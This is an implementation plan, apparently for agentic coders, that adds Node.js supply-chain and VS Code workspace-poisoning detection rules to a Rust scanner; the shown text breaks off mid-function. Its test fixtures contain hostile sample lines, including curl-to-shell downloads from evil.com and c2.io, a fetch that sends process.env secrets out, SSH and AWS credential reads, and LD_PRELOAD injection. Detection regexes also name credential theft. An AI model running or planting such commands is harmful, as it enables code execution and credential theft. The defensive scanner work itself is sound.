# New Attack Rules Design Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add nine new detection rules — NODE-007..011 (Node.js supply chain) and VSCODE-001..004 (VS Code workspace poisoning) — plus the infrastructure required to support a new `VsCode` language namespace.

**Architecture:**
- `scanner-rules`: add `Language::VsCode` variant and `Pattern::ExtensionIdCheck` variant
- `rules/`: add `vscode.toml` (4 rules), extend `nodejs.toml` (5 rules)
- `scanner-analysis`: add `vscode` module with `VsCodeAnalyzer`; update `nodejs/mod.rs` to handle the new pattern variant

**Tech Stack:** Rust stable, Cargo workspace, `serde`/`toml` for rule loading, `regex` + `serde_json` for analysis, TDD throughout.

---

## File Map

```
crates/scanner-rules/src/models.rs                          add Language::VsCode, Pattern::ExtensionIdCheck
crates/scanner-rules/src/rule_id.rs                         add parse test for VSCODE-001
crates/scanner-rules/tests/fixtures/valid_vscode.toml       new — VSCODE fixture for loader tests
crates/scanner-rules/tests/loader_test.rs                   update count test (6→11), add vscode tests
rules/nodejs.toml                                           add NODE-007..011
rules/vscode.toml                                           new — VSCODE-001..004
crates/scanner-analysis/src/nodejs/mod.rs                   add Pattern::ExtensionIdCheck => vec![] arm
crates/scanner-analysis/src/lib.rs                          add vscode module + VsCodeAnalyzer export
crates/scanner-analysis/src/vscode/mod.rs                   new — VsCodeAnalyzer struct
crates/scanner-analysis/src/vscode/checks/mod.rs            new — check() and extension_id_check()
crates/scanner-analysis/tests/node_007_test.rs              new
crates/scanner-analysis/tests/node_008_test.rs              new
crates/scanner-analysis/tests/node_009_test.rs              new
crates/scanner-analysis/tests/node_010_test.rs              new
crates/scanner-analysis/tests/node_011_test.rs              new
crates/scanner-analysis/tests/vscode_001_test.rs            new
crates/scanner-analysis/tests/vscode_002_test.rs            new
crates/scanner-analysis/tests/vscode_003_test.rs            new
crates/scanner-analysis/tests/vscode_004_test.rs            new
```

---

## Task 1: Extend `scanner-rules` — `Language::VsCode` and `Pattern::ExtensionIdCheck`

**Files:**
- Modify: `crates/scanner-rules/src/models.rs`
- Modify: `crates/scanner-rules/src/rule_id.rs`
- Modify: `crates/scanner-rules/tests/loader_test.rs`
- Create: `crates/scanner-rules/tests/fixtures/valid_vscode.toml`

- [ ] **Step 1: Write failing tests**

Add to the `#[cfg(test)]` block in `crates/scanner-rules/src/models.rs`:
```rust
#[test]
fn vscode_prefix_is_vscode() {
    assert_eq!(Language::VsCode.prefix(), "VSCODE");
}

#[test]
fn from_prefix_vscode_returns_vscode() {
    assert_eq!(Language::from_prefix("VSCODE"), Some(Language::VsCode));
}
```

Add to the `#[cfg(test)]` block in `crates/scanner-rules/src/rule_id.rs`:
```rust
#[test]
fn parse_accepts_valid_vscode_id() {
    assert!(RuleId::parse("VSCODE-001").is_ok());
}
```

Create `crates/scanner-rules/tests/fixtures/valid_vscode.toml`:
```toml
[[rules]]
id = "VSCODE-001"
name = "Test VsCode rule"
description = "A valid VS Code test rule."
severity = "Medium"
language = "VsCode"
pattern = { type = "ExtensionIdCheck" }
```

Add to `crates/scanner-rules/tests/loader_test.rs`:
```rust
#[test]
fn loads_valid_vscode_ruleset() {
    let path = Path::new("tests/fixtures/valid_vscode.toml");
    let ruleset = load(path).expect("should load VSCODE ruleset");
    assert_eq!(ruleset.rules.len(), 1);
    assert_eq!(ruleset.rules[0].name, "Test VsCode rule");
}
```

- [ ] **Step 2: Run to verify failure**
```bash
cargo test -p scanner-rules
```
Expected: compile error — `Language::VsCode` variant does not exist.

- [ ] **Step 3: Implement**

In `crates/scanner-rules/src/models.rs`, add the `VsCode` variant to `Language` and `ExtensionIdCheck` to `Pattern`:
```rust
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(rename_all = "PascalCase")]
pub enum Language {
    NodeJs,
    Any,
    VsCode,
}

impl Language {
    #[must_use]
    pub fn prefix(&self) -> &'static str {
        match self {
            Language::NodeJs => "NODE",
            Language::Any    => "ANY",
            Language::VsCode => "VSCODE",
        }
    }

    #[must_use]
    pub fn from_prefix(s: &str) -> Option<Self> {
        match s {
            "NODE"   => Some(Language::NodeJs),
            "ANY"    => Some(Language::Any),
            "VSCODE" => Some(Language::VsCode),
            _        => None,
        }
    }
}

#[derive(Debug, Clone, serde::Deserialize)]
#[serde(tag = "type")]
pub enum Pattern {
    Regex { value: String },
    ScriptKey { keys: Vec<String> },
    FileMatch { glob: String },
    TypoSquat { known_packages: Vec<String> },
    ExtensionIdCheck,
}
```

- [ ] **Step 4: Run tests to verify they pass**
```bash
cargo test -p scanner-rules
```
Expected: all existing tests plus the 4 new ones pass.

- [ ] **Step 5: Commit**
```bash
git add crates/scanner-rules/src/models.rs \
        crates/scanner-rules/src/rule_id.rs \
        crates/scanner-rules/tests/fixtures/valid_vscode.toml \
        crates/scanner-rules/tests/loader_test.rs
git commit -m "feat(scanner-rules): add Language::VsCode and Pattern::ExtensionIdCheck"
```

---

## Task 2: Add TOML rule files — NODE-007..011 and VSCODE-001..004

**Files:**
- Modify: `rules/nodejs.toml`
- Modify: `crates/scanner-rules/tests/loader_test.rs`
- Create: `rules/vscode.toml`

- [ ] **Step 1: Write failing tests**

In `crates/scanner-rules/tests/loader_test.rs`, update the existing `loads_default_nodejs_ruleset` test and add a new vscode test:
```rust
#[test]
fn loads_default_nodejs_ruleset() {
    let path = std::path::Path::new("../../rules/nodejs.toml");
    let ruleset = load(path).expect("default ruleset must be valid");
    assert_eq!(ruleset.rules.len(), 11);
}

#[test]
fn loads_default_vscode_ruleset() {
    let path = std::path::Path::new("../../rules/vscode.toml");
    let ruleset = load(path).expect("vscode ruleset must be valid");
    assert_eq!(ruleset.rules.len(), 4);
}
```

- [ ] **Step 2: Run to verify failure**
```bash
cargo test -p scanner-rules
```
Expected: `loads_default_nodejs_ruleset` fails (count is 6, not 11); `loads_default_vscode_ruleset` fails (file does not exist).

- [ ] **Step 3: Implement**

Append to `rules/nodejs.toml`:
```toml
[[rules]]
id = "NODE-007"
name = "Credential file access"
description = "Reads sensitive credential files (~/.ssh, ~/.aws, ~/.gnupg, ~/.npmrc, ~/.netrc), a common pattern for credential exfiltration in malicious npm packages."
severity = "Critical"
language = "NodeJs"
pattern = { type = "Regex", value = "readFileSync\\s*\\(['\"].*(?:\\.ssh|\\.aws|\\.gnupg|\\.npmrc|\\.netrc)|readFile\\s*\\(['\"].*(?:\\.ssh|\\.aws|\\.gnupg|\\.npmrc|\\.netrc)" }

[[rules]]
id = "NODE-008"
name = "Dynamic eval alternative"
description = "Uses new Function(), setTimeout(string), or setInterval(string) to execute dynamic code — common obfuscation techniques that bypass static eval detection."
severity = "High"
language = "NodeJs"
pattern = { type = "Regex", value = "new\\s+Function\\s*\\(|setTimeout\\s*\\(\\s*['\"]|setInterval\\s*\\(\\s*['\"]" }

[[rules]]
id = "NODE-009"
name = "Prototype pollution"
description = "Mutates Object.prototype or accesses __proto__ directly, enabling silent injection of properties into every downstream object in the process."
severity = "High"
language = "NodeJs"
pattern = { type = "Regex", value = 'Object\.prototype\.|__proto__\s*\[' }

[[rules]]
id = "NODE-010"
name = "Env variable exfiltration"
description = "Combines process.env access with a network primitive (fetch, http, axios, request) on the same line — a strong indicator of credential exfiltration."
severity = "Critical"
language = "NodeJs"
pattern = { type = "Regex", value = 'process\.env.*(?:fetch|http|axios|request)|(?:fetch|http|axios|request).*process\.env' }

[[rules]]
id = "NODE-011"
name = "Expanded lifecycle hooks"
description = "Detects the full set of npm lifecycle scripts that execute automatically during install or publish, including prepare, prepack, and postpack which bypass postinstall-only defences."
severity = "Critical"
language = "NodeJs"
pattern = { type = "ScriptKey", keys = ["postinstall", "preinstall", "prepare", "install", "prepack", "postpack"] }
```

Create `rules/vscode.toml`:
```toml
[[rules]]
id = "VSCODE-001"
name = "Auto-run task on open"
description = "A task with runOn: folderOpen executes silently when a developer opens the repository — no prompt required. Used by attackers for immediate code execution on developer machines."
severity = "Critical"
language = "VsCode"
pattern = { type = "Regex", value = "\"runOn\"\\s*:\\s*\"folderOpen\"" }

[[rules]]
id = "VSCODE-002"
name = "Interpreter path hijacking"
description = "Overrides python.defaultInterpreterPath, eslint.nodePath, or typescript.tsdk to point at a malicious wrapper binary, hijacking every tool invocation VS Code makes."
severity = "Critical"
language = "VsCode"
pattern = { type = "Regex", value = 'python\.defaultInterpreterPath|eslint\.nodePath|typescript\.tsdk' }

[[rules]]
id = "VSCODE-003"
name = "Terminal env injection"
description = "Injects PATH, LD_PRELOAD, or DYLD_INSERT_LIBRARIES via terminal.integrated.env, hijacking every subprocess spawned from the VS Code integrated terminal."
severity = "High"
language = "VsCode"
pattern = { type = "Regex", value = 'terminal\.integrated\.env.*(?:PATH|LD_PRELOAD|DYLD_INSERT)' }

[[rules]]
id = "VSCODE-004"
name = "Suspicious extension recommendation"
description = "Extension IDs in extensions.json must have a publisher.name format. IDs without a dot separator do not belong to any registered publisher and are a social engineering marker."
severity = "Medium"
language = "VsCode"
pattern = { type = "ExtensionIdCheck" }
```

- [ ] **Step 4: Run tests to verify they pass**
```bash
cargo test -p scanner-rules
```
Expected: all tests pass including `loads_default_nodejs_ruleset` (11 rules) and `loads_default_vscode_ruleset` (4 rules).

- [ ] **Step 5: Commit**
```bash
git add rules/nodejs.toml rules/vscode.toml crates/scanner-rules/tests/loader_test.rs
git commit -m "feat(rules): add NODE-007..011 and VSCODE-001..004 rule definitions"
```

---

## Task 3: NODE-007..011 analysis tests and `ExtensionIdCheck` arm in `NodeJsAnalyzer`

**Files:**
- Modify: `crates/scanner-analysis/src/nodejs/mod.rs`
- Create: `crates/scanner-analysis/tests/node_007_test.rs`
- Create: `crates/scanner-analysis/tests/node_008_test.rs`
- Create: `crates/scanner-analysis/tests/node_009_test.rs`
- Create: `crates/scanner-analysis/tests/node_010_test.rs`
- Create: `crates/scanner-analysis/tests/node_011_test.rs`

- [ ] **Step 1: Write failing tests**

Create `crates/scanner-analysis/tests/node_007_test.rs`:
```rust
use scanner_analysis::{nodejs::NodeJsAnalyzer, Analyzer};
use scanner_repository::{FileContent, RepoFile, RepoSnapshot};
use scanner_rules::{Language, Pattern, Rule, RuleId, RuleSet, Severity};
use std::{path::PathBuf, sync::Arc};

fn snapshot(filename: &str, content: &str) -> RepoSnapshot {
    RepoSnapshot {
        owner: "t".to_owned(),
        name: "r".to_owned(),
        files: vec![RepoFile {
            path: PathBuf::from(filename),
            content: FileContent::Text(content.to_owned()),
            size_bytes: content.len() as u64,
        }],
    }
}

fn ruleset() -> Arc<RuleSet> {
    Arc::new(RuleSet {
        rules: vec![Rule {
            id: RuleId::parse("NODE-007").unwrap(),
            name: "Credential file access".to_owned(),
            description: String::new(),
            severity: Severity::Critical,
            language: Language::NodeJs,
            pattern: Pattern::Regex {
                value: r#"readFileSync\s*\(['"].*(?:\.ssh|\.aws|\.gnupg|\.npmrc|\.netrc)|readFile\s*\(['"].*(?:\.ssh|\.aws|\.gnupg|\.npmrc|\.netrc)"#.to_owned(),
            },
        }],
    })
}

#[test]
fn detects_ssh_key_read() {
    let src = r#"const key = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');"#;
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn detects_aws_credentials_read() {
    let src = r#"readFile('/root/.aws/credentials', callback);"#;
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn ignores_safe_file_read() {
    let src = r#"const data = fs.readFileSync('./config.json', 'utf8');"#;
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert!(findings.is_empty());
}

#[test]
fn ignores_non_js_files() {
    let src = r#"readFileSync('/root/.ssh/id_rsa')"#;
    let findings = NodeJsAnalyzer.analyze(&snapshot("README.md", src), &ruleset());
    assert!(findings.is_empty());
}
```

Create `crates/scanner-analysis/tests/node_008_test.rs`:
```rust
use scanner_analysis::{nodejs::NodeJsAnalyzer, Analyzer};
use scanner_repository::{FileContent, RepoFile, RepoSnapshot};
use scanner_rules::{Language, Pattern, Rule, RuleId, RuleSet, Severity};
use std::{path::PathBuf, sync::Arc};

fn snapshot(filename: &str, content: &str) -> RepoSnapshot {
    RepoSnapshot {
        owner: "t".to_owned(),
        name: "r".to_owned(),
        files: vec![RepoFile {
            path: PathBuf::from(filename),
            content: FileContent::Text(content.to_owned()),
            size_bytes: content.len() as u64,
        }],
    }
}

fn ruleset() -> Arc<RuleSet> {
    Arc::new(RuleSet {
        rules: vec![Rule {
            id: RuleId::parse("NODE-008").unwrap(),
            name: "Dynamic eval alternative".to_owned(),
            description: String::new(),
            severity: Severity::High,
            language: Language::NodeJs,
            pattern: Pattern::Regex {
                value: r#"new\s+Function\s*\(|setTimeout\s*\(\s*['"]|setInterval\s*\(\s*['"]"#.to_owned(),
            },
        }],
    })
}

#[test]
fn detects_new_function_constructor() {
    let src = "const fn = new Function('return process.env.SECRET')();";
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn detects_settimeout_with_string() {
    let src = r#"setTimeout("malicious()", 0);"#;
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn ignores_settimeout_with_callback() {
    let src = "setTimeout(callback, 1000);";
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert!(findings.is_empty());
}
```

Create `crates/scanner-analysis/tests/node_009_test.rs`:
```rust
use scanner_analysis::{nodejs::NodeJsAnalyzer, Analyzer};
use scanner_repository::{FileContent, RepoFile, RepoSnapshot};
use scanner_rules::{Language, Pattern, Rule, RuleId, RuleSet, Severity};
use std::{path::PathBuf, sync::Arc};

fn snapshot(filename: &str, content: &str) -> RepoSnapshot {
    RepoSnapshot {
        owner: "t".to_owned(),
        name: "r".to_owned(),
        files: vec![RepoFile {
            path: PathBuf::from(filename),
            content: FileContent::Text(content.to_owned()),
            size_bytes: content.len() as u64,
        }],
    }
}

fn ruleset() -> Arc<RuleSet> {
    Arc::new(RuleSet {
        rules: vec![Rule {
            id: RuleId::parse("NODE-009").unwrap(),
            name: "Prototype pollution".to_owned(),
            description: String::new(),
            severity: Severity::High,
            language: Language::NodeJs,
            pattern: Pattern::Regex {
                value: r"Object\.prototype\.|__proto__\s*\[".to_owned(),
            },
        }],
    })
}

#[test]
fn detects_object_prototype_mutation() {
    let src = "Object.prototype.toString = function() { return 'evil'; };";
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn detects_proto_bracket_access() {
    let src = r#"obj.__proto__["admin"] = true;"#;
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn ignores_safe_object_usage() {
    let src = "const copy = Object.assign({}, source);";
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert!(findings.is_empty());
}
```

Create `crates/scanner-analysis/tests/node_010_test.rs`:
```rust
use scanner_analysis::{nodejs::NodeJsAnalyzer, Analyzer};
use scanner_repository::{FileContent, RepoFile, RepoSnapshot};
use scanner_rules::{Language, Pattern, Rule, RuleId, RuleSet, Severity};
use std::{path::PathBuf, sync::Arc};

fn snapshot(filename: &str, content: &str) -> RepoSnapshot {
    RepoSnapshot {
        owner: "t".to_owned(),
        name: "r".to_owned(),
        files: vec![RepoFile {
            path: PathBuf::from(filename),
            content: FileContent::Text(content.to_owned()),
            size_bytes: content.len() as u64,
        }],
    }
}

fn ruleset() -> Arc<RuleSet> {
    Arc::new(RuleSet {
        rules: vec![Rule {
            id: RuleId::parse("NODE-010").unwrap(),
            name: "Env variable exfiltration".to_owned(),
            description: String::new(),
            severity: Severity::Critical,
            language: Language::NodeJs,
            pattern: Pattern::Regex {
                value: r"process\.env.*(?:fetch|http|axios|request)|(?:fetch|http|axios|request).*process\.env".to_owned(),
            },
        }],
    })
}

#[test]
fn detects_env_sent_via_fetch() {
    let src = "fetch('https://evil.com', { body: process.env.SECRET });";
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn detects_axios_with_env_on_same_line() {
    let src = "axios.post(process.env.TARGET_URL, { key: token });";
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn ignores_env_read_without_network() {
    let src = "const apiKey = process.env.API_KEY;";
    let findings = NodeJsAnalyzer.analyze(&snapshot("index.js", src), &ruleset());
    assert!(findings.is_empty());
}
```

Create `crates/scanner-analysis/tests/node_011_test.rs`:
```rust
use scanner_analysis::{nodejs::NodeJsAnalyzer, Analyzer};
use scanner_repository::{FileContent, RepoFile, RepoSnapshot};
use scanner_rules::{Language, Pattern, Rule, RuleId, RuleSet, Severity};
use std::{path::PathBuf, sync::Arc};

fn snapshot(content: &str) -> RepoSnapshot {
    RepoSnapshot {
        owner: "t".to_owned(),
        name: "r".to_owned(),
        files: vec![RepoFile {
            path: std::path::PathBuf::from("package.json"),
            content: FileContent::Text(content.to_owned()),
            size_bytes: content.len() as u64,
        }],
    }
}

fn ruleset() -> Arc<RuleSet> {
    Arc::new(RuleSet {
        rules: vec![Rule {
            id: RuleId::parse("NODE-011").unwrap(),
            name: "Expanded lifecycle hooks".to_owned(),
            description: String::new(),
            severity: Severity::Critical,
            language: Language::NodeJs,
            pattern: Pattern::ScriptKey {
                keys: vec![
                    "postinstall".to_owned(),
                    "preinstall".to_owned(),
                    "prepare".to_owned(),
                    "install".to_owned(),
                    "prepack".to_owned(),
                    "postpack".to_owned(),
                ],
            },
        }],
    })
}

#[test]
fn detects_prepare_hook() {
    let pkg = r#"{"scripts": {"prepare": "curl http://evil.com | sh"}}"#;
    let findings = NodeJsAnalyzer.analyze(&snapshot(pkg), &ruleset());
    assert_eq!(findings.len(), 1);
    assert!(findings[0].message.contains("prepare"));
}

#[test]
fn detects_prepack_hook() {
    let pkg = r#"{"scripts": {"prepack": "exfiltrate()"}}"#;
    let findings = NodeJsAnalyzer.analyze(&snapshot(pkg), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn ignores_safe_scripts() {
    let pkg = r#"{"scripts": {"build": "tsc", "test": "jest", "lint": "eslint ."}}"#;
    let findings = NodeJsAnalyzer.analyze(&snapshot(pkg), &ruleset());
    assert!(findings.is_empty());
}
```

- [ ] **Step 2: Run to verify failure**
```bash
cargo test -p scanner-analysis
```
Expected: compile error in `nodejs/mod.rs` — non-exhaustive pattern match: `Pattern::ExtensionIdCheck` not covered.

- [ ] **Step 3: Implement**

In `crates/scanner-analysis/src/nodejs/mod.rs`, add the missing arm to the pattern match:
```rust
use crate::{analyzer::Analyzer, models::Finding};
use scanner_repository::RepoSnapshot;
use scanner_rules::{Pattern, RuleSet};
use std::sync::Arc;

pub mod checks;

pub struct NodeJsAnalyzer;

impl Analyzer for NodeJsAnalyzer {
    fn analyze(&self, snapshot: &RepoSnapshot, rules: &Arc<RuleSet>) -> Vec<Finding> {
        let mut findings = Vec::new();
        for rule in &rules.rules {
            for file in &snapshot.files {
                let new = match &rule.pattern {
                    Pattern::ScriptKey { keys } => checks::postinstall::check(file, rule, keys),
                    Pattern::Regex { value } => checks::obfuscation::check(file, rule, value),
                    Pattern::TypoSquat { known_packages } => {
                        checks::typosquat::check(file, rule, known_packages)
                    }
                    Pattern::FileMatch { glob } => {
                        checks::shell::check_file_match(file, rule, glob)
                    }
                    Pattern::ExtensionIdCheck => vec![],
                };
                findings.extend(new);
            }
        }
        findings
    }
}
```

- [ ] **Step 4: Run tests to verify they pass**
```bash
cargo test -p scanner-analysis
```
Expected: all existing tests pass plus 14 new tests (node_007..011, 2-4 cases each).

- [ ] **Step 5: Commit**
```bash
git add crates/scanner-analysis/src/nodejs/mod.rs \
        crates/scanner-analysis/tests/node_007_test.rs \
        crates/scanner-analysis/tests/node_008_test.rs \
        crates/scanner-analysis/tests/node_009_test.rs \
        crates/scanner-analysis/tests/node_010_test.rs \
        crates/scanner-analysis/tests/node_011_test.rs
git commit -m "feat(scanner-analysis): add NODE-007..011 analysis tests"
```

---

## Task 4: Implement `VsCodeAnalyzer` with VSCODE-001..004 tests

**Files:**
- Modify: `crates/scanner-analysis/src/lib.rs`
- Create: `crates/scanner-analysis/src/vscode/mod.rs`
- Create: `crates/scanner-analysis/src/vscode/checks/mod.rs`
- Create: `crates/scanner-analysis/tests/vscode_001_test.rs`
- Create: `crates/scanner-analysis/tests/vscode_002_test.rs`
- Create: `crates/scanner-analysis/tests/vscode_003_test.rs`
- Create: `crates/scanner-analysis/tests/vscode_004_test.rs`

- [ ] **Step 1: Write failing tests**

Create `crates/scanner-analysis/tests/vscode_001_test.rs`:
```rust
use scanner_analysis::{vscode::VsCodeAnalyzer, Analyzer};
use scanner_repository::{FileContent, RepoFile, RepoSnapshot};
use scanner_rules::{Language, Pattern, Rule, RuleId, RuleSet, Severity};
use std::{path::PathBuf, sync::Arc};

fn snapshot(filename: &str, content: &str) -> RepoSnapshot {
    RepoSnapshot {
        owner: "t".to_owned(),
        name: "r".to_owned(),
        files: vec![RepoFile {
            path: PathBuf::from(filename),
            content: FileContent::Text(content.to_owned()),
            size_bytes: content.len() as u64,
        }],
    }
}

fn ruleset() -> Arc<RuleSet> {
    Arc::new(RuleSet {
        rules: vec![Rule {
            id: RuleId::parse("VSCODE-001").unwrap(),
            name: "Auto-run task on open".to_owned(),
            description: String::new(),
            severity: Severity::Critical,
            language: Language::VsCode,
            pattern: Pattern::Regex {
                value: r#""runOn"\s*:\s*"folderOpen""#.to_owned(),
            },
        }],
    })
}

#[test]
fn detects_folder_open_task() {
    let content = r#"{ "tasks": [{ "label": "evil", "runOn": "folderOpen", "command": "curl http://c2.io | sh" }] }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/tasks.json", content), &ruleset());
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].file, PathBuf::from(".vscode/tasks.json"));
}

#[test]
fn ignores_manual_tasks() {
    let content = r#"{ "tasks": [{ "label": "build", "command": "cargo build" }] }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/tasks.json", content), &ruleset());
    assert!(findings.is_empty());
}

#[test]
fn ignores_file_outside_vscode_dir() {
    let content = r#"{ "runOn": "folderOpen" }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot("tasks.json", content), &ruleset());
    assert!(findings.is_empty());
}
```

Create `crates/scanner-analysis/tests/vscode_002_test.rs`:
```rust
use scanner_analysis::{vscode::VsCodeAnalyzer, Analyzer};
use scanner_repository::{FileContent, RepoFile, RepoSnapshot};
use scanner_rules::{Language, Pattern, Rule, RuleId, RuleSet, Severity};
use std::{path::PathBuf, sync::Arc};

fn snapshot(filename: &str, content: &str) -> RepoSnapshot {
    RepoSnapshot {
        owner: "t".to_owned(),
        name: "r".to_owned(),
        files: vec![RepoFile {
            path: PathBuf::from(filename),
            content: FileContent::Text(content.to_owned()),
            size_bytes: content.len() as u64,
        }],
    }
}

fn ruleset() -> Arc<RuleSet> {
    Arc::new(RuleSet {
        rules: vec![Rule {
            id: RuleId::parse("VSCODE-002").unwrap(),
            name: "Interpreter path hijacking".to_owned(),
            description: String::new(),
            severity: Severity::Critical,
            language: Language::VsCode,
            pattern: Pattern::Regex {
                value: r"python\.defaultInterpreterPath|eslint\.nodePath|typescript\.tsdk".to_owned(),
            },
        }],
    })
}

#[test]
fn detects_python_interpreter_override() {
    let content = r#"{ "python.defaultInterpreterPath": "./scripts/python" }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/settings.json", content), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn detects_eslint_node_path_override() {
    let content = r#"{ "eslint.nodePath": "./evil/node" }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/settings.json", content), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn ignores_safe_settings() {
    let content = r#"{ "editor.fontSize": 14, "editor.tabSize": 2 }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/settings.json", content), &ruleset());
    assert!(findings.is_empty());
}
```

Create `crates/scanner-analysis/tests/vscode_003_test.rs`:
```rust
use scanner_analysis::{vscode::VsCodeAnalyzer, Analyzer};
use scanner_repository::{FileContent, RepoFile, RepoSnapshot};
use scanner_rules::{Language, Pattern, Rule, RuleId, RuleSet, Severity};
use std::{path::PathBuf, sync::Arc};

fn snapshot(filename: &str, content: &str) -> RepoSnapshot {
    RepoSnapshot {
        owner: "t".to_owned(),
        name: "r".to_owned(),
        files: vec![RepoFile {
            path: PathBuf::from(filename),
            content: FileContent::Text(content.to_owned()),
            size_bytes: content.len() as u64,
        }],
    }
}

fn ruleset() -> Arc<RuleSet> {
    Arc::new(RuleSet {
        rules: vec![Rule {
            id: RuleId::parse("VSCODE-003").unwrap(),
            name: "Terminal env injection".to_owned(),
            description: String::new(),
            severity: Severity::High,
            language: Language::VsCode,
            pattern: Pattern::Regex {
                value: r"terminal\.integrated\.env.*(?:PATH|LD_PRELOAD|DYLD_INSERT)".to_owned(),
            },
        }],
    })
}

#[test]
fn detects_ld_preload_injection() {
    let content = r#"{ "terminal.integrated.env.linux": { "LD_PRELOAD": "./hack.so" } }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/settings.json", content), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn detects_path_hijack() {
    let content = r#"{ "terminal.integrated.env.osx": { "PATH": "./evil:$PATH" } }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/settings.json", content), &ruleset());
    assert_eq!(findings.len(), 1);
}

#[test]
fn ignores_safe_terminal_env() {
    let content = r#"{ "terminal.integrated.env.linux": { "CUSTOM_VAR": "value" } }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/settings.json", content), &ruleset());
    assert!(findings.is_empty());
}
```

Create `crates/scanner-analysis/tests/vscode_004_test.rs`:
```rust
use scanner_analysis::{vscode::VsCodeAnalyzer, Analyzer};
use scanner_repository::{FileContent, RepoFile, RepoSnapshot};
use scanner_rules::{Language, Pattern, Rule, RuleId, RuleSet, Severity};
use std::{path::PathBuf, sync::Arc};

fn snapshot(filename: &str, content: &str) -> RepoSnapshot {
    RepoSnapshot {
        owner: "t".to_owned(),
        name: "r".to_owned(),
        files: vec![RepoFile {
            path: PathBuf::from(filename),
            content: FileContent::Text(content.to_owned()),
            size_bytes: content.len() as u64,
        }],
    }
}

fn ruleset() -> Arc<RuleSet> {
    Arc::new(RuleSet {
        rules: vec![Rule {
            id: RuleId::parse("VSCODE-004").unwrap(),
            name: "Suspicious extension recommendation".to_owned(),
            description: String::new(),
            severity: Severity::Medium,
            language: Language::VsCode,
            pattern: Pattern::ExtensionIdCheck,
        }],
    })
}

#[test]
fn detects_extension_id_without_publisher_dot() {
    let content = r#"{ "recommendations": ["malicious-ext"] }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/extensions.json", content), &ruleset());
    assert_eq!(findings.len(), 1);
    assert!(findings[0].message.contains("malicious-ext"));
}

#[test]
fn flags_each_invalid_id_separately() {
    let content = r#"{ "recommendations": ["hacktools", "ms-python.python", "noPublisher"] }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/extensions.json", content), &ruleset());
    assert_eq!(findings.len(), 2);
}

#[test]
fn ignores_valid_publisher_dot_name_ids() {
    let content = r#"{ "recommendations": ["ms-python.python", "vscodevim.vim", "rust-lang.rust-analyzer"] }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/extensions.json", content), &ruleset());
    assert!(findings.is_empty());
}

#[test]
fn ignores_non_extensions_json_file() {
    let content = r#"{ "recommendations": ["hacktools"] }"#;
    let findings = VsCodeAnalyzer.analyze(&snapshot(".vscode/settings.json", content), &ruleset());
    assert!(findings.is_empty());
}
```

- [ ] **Step 2: Run to verify failure**
```bash
cargo test -p scanner-analysis
```
Expected: compile error — `scanner_analysis::vscode` module does not exist.

- [ ] **Step 3: Implement**

Create `crates/scanner-analysis/src/vscode/checks/mod.rs`:
```rust
use crate::models::Finding;
use scanner_repository::{FileContent, RepoFile};
use scanner_rules::Rule;

#[must_use]
pub fn check(file: &RepoFile, rule: &Rule, pattern: &str) -> Vec<Finding> {
    if !file.path.starts_with(".vscode") {
        return vec![];
    }
    let FileContent::Text(ref content) = file.content else {
        return vec![];
    };
    let Ok(re) = regex::Regex::new(pattern) else {
        return vec![];
    };
    content
        .lines()
        .enumerate()
        .filter_map(|(i, line)| {
            re.find(line).map(|_| Finding {
                rule_id: rule.id.clone(),
                severity: rule.severity.clone(),
                file: file.path.clone(),
                line: u32::try_from(i).ok().map(|n| n + 1),
                message: rule.name.clone(),
                snippet: Some(line.trim().to_owned()),
            })
        })
        .collect()
}

#[must_use]
pub fn extension_id_check(file: &RepoFile, rule: &Rule) -> Vec<Finding> {
    if !file.path.starts_with(".vscode") {
        return vec![];
    }
    if file.path.file_name().is_none_or(|n| n != "extensions.json") {
        return vec![];
    }
    let FileContent::Text(ref content) = file.content else {
        return vec![];
    };
    let Ok(json) = serde_json::from_str::<serde_json::Value>(content) else {
        return vec![];
    };
    let Some(recs) = json.get("recommendations").and_then(|r| r.as_array()) else {
        return vec![];
    };
    recs.iter()
        .filter_map(|id| id.as_str())
        .filter(|id| !id.contains('.'))
